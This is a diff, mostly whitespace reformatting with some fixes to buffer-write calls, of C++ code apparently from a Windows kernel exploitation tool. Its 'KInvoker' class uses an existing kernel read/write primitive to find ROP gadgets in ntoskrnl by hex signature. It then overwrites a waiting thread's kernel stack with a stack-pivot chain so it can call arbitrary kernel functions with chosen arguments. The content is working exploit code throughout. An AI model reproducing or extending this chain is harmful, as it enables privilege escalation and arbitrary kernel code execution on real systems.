@@ -12,11 +12,11 @@
 
 constexpr ULONG c_TrapFrameSize = 0x190;
 
-class KInvoker 
+class KInvoker
 {
 public:
-	KInvoker() : m_TerminateWorker(false) {
-		m_WorkerThread = std::thread(&KInvoker::WorkerThread, this);
+	KInvoker() : m_TerminateWorker( false ) {
+		m_WorkerThread = std::thread( &KInvoker::WorkerThread, this );
 		if (!InitializeGadgets()) {
 			// error
 		}
@@ -24,7 +24,7 @@ public:
 
 	~KInvoker() {
 		{
-			std::lock_guard<std::mutex> lock(m_TaskQueueMutex);
+			std::lock_guard<std::mutex> lock( m_TaskQueueMutex );
 			m_TerminateWorker = true;
 		}
 		m_QueueUpdateVariable.notify_all();
@@ -38,16 +38,16 @@ public:
 		const char* FunctionName,
 		Args... Arguments
 	) {
-		std::optional<kAddress> function = g_KernelBinary->ResolveExport(FunctionName);
+		std::optional<kAddress> function = g_KernelBinary->ResolveExport( FunctionName );
 		if (!function) {
 			LOG_WARN( "Failed to resolve function name %s", FunctionName );
 			return -1;
 		}
 
-		return CallKernelFunction(function.value(), Arguments...);
+		return CallKernelFunction( function.value(), Arguments... );
 	}
 
-	static void WaitUntilThreadIsWaiting(DWORD ThreadTid)
+	static void WaitUntilThreadIsWaiting( DWORD ThreadTid )
 	{
 		HANDLE thread = OpenThread( THREAD_QUERY_INFORMATION, false, ThreadTid );
 		if (thread == 0) {
@@ -85,31 +85,31 @@ public:
 	template <typename... Args>
 	Qword CallKernelFunction(
 		kAddress Function,
-		Args... Arguments)
+		Args... Arguments )
 	{
-		auto args = std::make_tuple(std::forward<Args>(Arguments)...);
-		HANDLE event = CreateEventA(nullptr, true, false, nullptr);
+		auto args = std::make_tuple( std::forward<Args>( Arguments )... );
+		HANDLE event = CreateEventA( nullptr, true, false, nullptr );
 
 		DWORD currentTid = GetCurrentThreadId();
 
-		m_TaskQueue.push([&] {
-				LOG_DEBUG( "Starting worker, tid=%d", currentTid );
+		m_TaskQueue.push( [&] {
+			LOG_DEBUG( "Starting worker, tid=%d", currentTid );
 
-				WaitUntilThreadIsWaiting( currentTid );
-				std::optional<kAddress> thread = Resolves::GetThreadAddressInProcess(currentTid, GetCurrentProcessId());
-				if (!thread) {
-					FATAL( "Failed to resolve thread address, tid=%d", currentTid );
-				}
+			WaitUntilThreadIsWaiting( currentTid );
+			std::optional<kAddress> thread = Resolves::GetThreadAddressInProcess( currentTid, GetCurrentProcessId() );
+			if (!thread) {
+				FATAL( "Failed to resolve thread address, tid=%d", currentTid );
+			}
 
-				LOG_DEBUG( "Calling kernel function at 0x%llx, thread address is 0x%llx", Function, thread.value() );
-				
-				OverrideThreadStackWithFunctionCall(Function, thread.value(), args);
-				SetEvent(event);
-			});
+			LOG_DEBUG( "Calling kernel function at 0x%llx, thread address is 0x%llx", Function, thread.value() );
+
+			OverrideThreadStackWithFunctionCall( Function, thread.value(), args );
+			SetEvent( event );
+			} );
 
 		m_QueueUpdateVariable.notify_all();
 
-		auto returnValue = NtWaitForSingleObject(event, false, nullptr);
+		auto returnValue = NtWaitForSingleObject( event, false, nullptr );
 		LOG_DEBUG( "Returned from NtWaitForSingleObject, return value is 0x%08llx", returnValue );
 		CloseHandle( event );
 
@@ -128,22 +128,22 @@ private:
 	static void CopyStackArgumentsHelper(
 		kAddress Rsp,
 		const ArgsTuple& Arguments,
-		std::index_sequence<Indicies...>) 
+		std::index_sequence<Indicies...> )
 	{
 		Qword remainingArgs[] = {
 			(Indicies >= 4 ? Qword( std::get<Indicies>( Arguments ) ) : Qword{})...
 		};
 
 		auto numberOfStackArgs = sizeof...(Indicies) - 4;
-		
+
 		// reserve shadow space
 		kAddress argumentsStart = Rsp + 0x20;
-		g_Rw->WriteBuffer( argumentsStart, std::span<Qword>( remainingArgs + 4, numberOfStackArgs ) );
+		g_Rw->WriteBuffer( argumentsStart, std::span<Byte>( (Byte*)(remainingArgs + 4), numberOfStackArgs * sizeof(Qword) ) );
 	}
 
 	static kAddress GetNtWaitForSingleObjectReturnAddress(
 		_In_ kAddress CallingThread,
-		_Out_ std::vector<Byte>& TrapFrameData)
+		_Out_ std::vector<Byte>& TrapFrameData )
 	{
 		//
 		// We target the last return address before returning to UserMode. The call stack after
@@ -156,7 +156,7 @@ private:
 		// We'll start scanning from the initial stack 
 		//
 
-		kAddress initialStack = g_Rw->ReadQword(CallingThread + Offsets::EThread::InitialStack);
+		kAddress initialStack = g_Rw->ReadQword( CallingThread + Offsets::EThread::InitialStack );
 
 		// Initial stack layout, stack grows down
 		// 
@@ -180,13 +180,13 @@ private:
 	void OverrideThreadStackWithFunctionCall(
 		_In_ kAddress Function,
 		_In_ kAddress CallingThread,
-		_In_ std::tuple<Args...> Arguments ) 
+		_In_ std::tuple<Args...> Arguments )
 	{
 		//
 		// We're restricted in the number of arguments we have, so before we're doing anything let's make sure
 		// we're covered.
 		//
-		
+
 		constexpr auto NumberOfArguments = std::tuple_size<decltype(Arguments)>::value;
 		if (NumberOfArguments > m_MaxAllowedStackArguments + 4) {
 			LOG_FAIL( "Cannot call function 0x%llx with 0x%llx arguments, more than the allowed 0x%llx",
@@ -195,11 +195,11 @@ private:
 		}
 
 		std::vector<Byte> previousStackData;
-		kAddress rsp = GetNtWaitForSingleObjectReturnAddress(CallingThread, previousStackData);
+		kAddress rsp = GetNtWaitForSingleObjectReturnAddress( CallingThread, previousStackData );
 		LOG_DEBUG( "Starting to overwrite from 0x%llx", rsp );
-		
+
 #define PUT_STACK(val) do { g_Rw->WriteQword(rsp, Qword(val)); LOG_DEBUG("Rsp: 0x%llx, val:0x%llx", rsp, Qword(val)); rsp += 8; } while (false);
-		
+
 		// Our pivot gadget uses rbp as the new stack pointer
 
 		auto newRsp = rsp - 0x3000;
@@ -207,12 +207,12 @@ private:
 		PUT_STACK( m_Gadgets.PopRbp );
 		PUT_STACK( newRsp );
 
-		PUT_STACK(m_Gadgets.StackPivot);
+		PUT_STACK( m_Gadgets.StackPivot );
 
 		rsp = newRsp;		// mov rsp, rbp
 		rsp += 0x30;		// add rsp, 0x30
-		PUT_STACK(0x1337);	// pop rdi
-		PUT_STACK(0x1337);	// pop rsi
+		PUT_STACK( 0x1337 );	// pop rdi
+		PUT_STACK( 0x1337 );	// pop rsi
 
 		//
 		// This will be the final value rbp takes before getting to the called function,
@@ -220,13 +220,13 @@ private:
 		// it is expected to be a pointer into the saved data. We'll populate it later
 		// when we know where the saved data resides.
 		//
-		kAddress pRbpValue = rsp; 
-		PUT_STACK(0x1337);	// pop rbp
+		kAddress pRbpValue = rsp;
+		PUT_STACK( 0x1337 );	// pop rbp
 
-		PUT_STACK(m_Gadgets.Retpoline);
+		PUT_STACK( m_Gadgets.Retpoline );
 
 		rsp += 0x20;
-		
+
 		//
 		// If we have more than 4 arguments, we need to get ourselves a bit more stack space,
 		// so instead of jumping to the function after the retpoline gadget,
@@ -241,10 +241,10 @@ private:
 		// add register arguments
 		auto beforeArgs = rsp;
 
-		if constexpr (NumberOfArguments >= 1) PUT_STACK(std::get<0>(Arguments));
-		if constexpr (NumberOfArguments >= 2) PUT_STACK(std::get<1>(Arguments));
-		if constexpr (NumberOfArguments >= 3) PUT_STACK(std::get<2>(Arguments));
-		if constexpr (NumberOfArguments >= 4) PUT_STACK(std::get<3>(Arguments));
+		if constexpr (NumberOfArguments >= 1) PUT_STACK( std::get<0>( Arguments ) );
+		if constexpr (NumberOfArguments >= 2) PUT_STACK( std::get<1>( Arguments ) );
+		if constexpr (NumberOfArguments >= 3) PUT_STACK( std::get<2>( Arguments ) );
+		if constexpr (NumberOfArguments >= 4) PUT_STACK( std::get<3>( Arguments ) );
 
 		rsp = beforeArgs + 0x20;
 
@@ -254,7 +254,7 @@ private:
 		//
 
 		// add remaining stack arguments
-		if constexpr (NumberOfArguments >= 5) 
+		if constexpr (NumberOfArguments >= 5)
 		{
 			PUT_STACK( m_Gadgets.AddRsp.Address );
 			CopyStackArgumentsHelper( rsp, Arguments, std::make_index_sequence<NumberOfArguments>{} );
@@ -269,8 +269,8 @@ private:
 		// Note that the buffer contains the return address to nt!KiSystemServiceCopyEnd.
 		//
 
-		LOG_DEBUG( "Writing saved stack data from %p sized 0x%llx, to 0x%llx", previousStackData.data(), previousStackData.size(), rsp);
-		g_Rw->WriteBuffer( rsp, std::span<Qword>( (Qword*) previousStackData.data(), previousStackData.size() / sizeof(Qword)));
+		LOG_DEBUG( "Writing saved stack data from %p sized 0x%llx, to 0x%llx", previousStackData.data(), previousStackData.size(), rsp );
+		g_Rw->WriteBuffer( rsp, std::span<Byte>( previousStackData.data(), previousStackData.size() ) );
 		DebugBreak();
 
 		// Remember to set rbp!
@@ -304,7 +304,7 @@ private:
 	{
 		std::optional<kAddress> gadgetAddress = std::nullopt;
 		Byte maxOffset = 0;
-		
+
 		//
 		// We want to support at least (0x60 - 0x20) / 8 = 8 stack arguments.
 		//		
@@ -318,14 +318,14 @@ private:
 		LOG_DEBUG( "add rsp, ret: %p", addRspRet.data() );
 
 		g_KernelBinary->ForEveryCodeSignatureOccurrence( addRspRet,
-			[&]( const Byte* Occurrence) -> bool {
+			[&]( const Byte* Occurrence ) -> bool {
 				Byte rspOffset = *(Occurrence + 3);
 
 				// irrelevant, continue search
 				if (rspOffset < MinAllowedRspOffset) return true;
 
 				if (rspOffset > maxOffset) {
-					gadgetAddress = g_KernelBinary->MappedToKernel(Occurrence);
+					gadgetAddress = g_KernelBinary->MappedToKernel( Occurrence );
 					maxOffset = rspOffset;
 				}
 
@@ -339,26 +339,26 @@ private:
 
 	bool InitializeGadgets()
 	{
-		LOG_DEBUG("Finding gadgets...");
+		LOG_DEBUG( "Finding gadgets..." );
 
 		const std::string RetpolineCode = "488b442420488b4c2428488b5424304c8b4424384c8b4c24404883c44848ffe0";
-		auto retpolineSignature = Sig::FromHex(RetpolineCode);
-		auto retpolineAddress =  g_KernelBinary->FindSignature(retpolineSignature, KernelBinary::LocationFlags::InCode);
+		auto retpolineSignature = Sig::FromHex( RetpolineCode );
+		auto retpolineAddress = g_KernelBinary->FindSignature( retpolineSignature, KernelBinary::LocationFlags::InCode );
 		if (!retpolineAddress) return false;
 		m_Gadgets.Retpoline = retpolineAddress.value();
 
 		LOG_DEBUG( "Found retpoline gadget at 0x%llx", retpolineAddress.value() );
 
 		const std::string StackPivotCode = "488be54883c4305f5e5dc3";
-		auto stackPivotSignature = Sig::FromHex(StackPivotCode);
-		auto stackPivotAddress = g_KernelBinary->FindSignature(stackPivotSignature, KernelBinary::LocationFlags::InCode);
+		auto stackPivotSignature = Sig::FromHex( StackPivotCode );
+		auto stackPivotAddress = g_KernelBinary->FindSignature( stackPivotSignature, KernelBinary::LocationFlags::InCode );
 		if (!stackPivotAddress) return false;
 		m_Gadgets.StackPivot = stackPivotAddress.value();
-	
+
 		LOG_DEBUG( "Found stack pivot gadget at 0x%llx", stackPivotAddress.value() );
 
-		auto PopRbpSignature = Sig::FromHex("5dc3");
-		auto popRbp = g_KernelBinary->FindSignature(PopRbpSignature, KernelBinary::LocationFlags::InCode);
+		auto PopRbpSignature = Sig::FromHex( "5dc3" );
+		auto popRbp = g_KernelBinary->FindSignature( PopRbpSignature, KernelBinary::LocationFlags::InCode );
 		if (!popRbp) return false;
 		m_Gadgets.PopRbp = popRbp.value();
 
@@ -369,8 +369,8 @@ private:
 		if (!addRspGadget) {
 			LOG_FAIL( "Failed to find add rsp gadget with sufficent space for stack arguments" );
 		}
-		
-		LOG_DEBUG( "Found add rsp, ? gadget at 0x%llx, offset=0x%x", addRspGadget.value(), rspOffset);
+
+		LOG_DEBUG( "Found add rsp, ? gadget at 0x%llx, offset=0x%x", addRspGadget.value(), rspOffset );
 
 		m_Gadgets.AddRsp.Address = addRspGadget.value();
 		m_Gadgets.AddRsp.Offset = rspOffset;
@@ -431,13 +431,13 @@ private:
 		struct {
 			// Gadget address
 			kAddress Address;
-			
+
 			// Offset by which we're adding rsp
 			Byte Offset;
 		} AddRsp;
 
 	} m_Gadgets;
-	
+
 	// Max allowed stack arguments, restricted by availibility of add rsp,? gadgets
 	// in local ntos.
 	Dword m_MaxAllowedStackArguments;
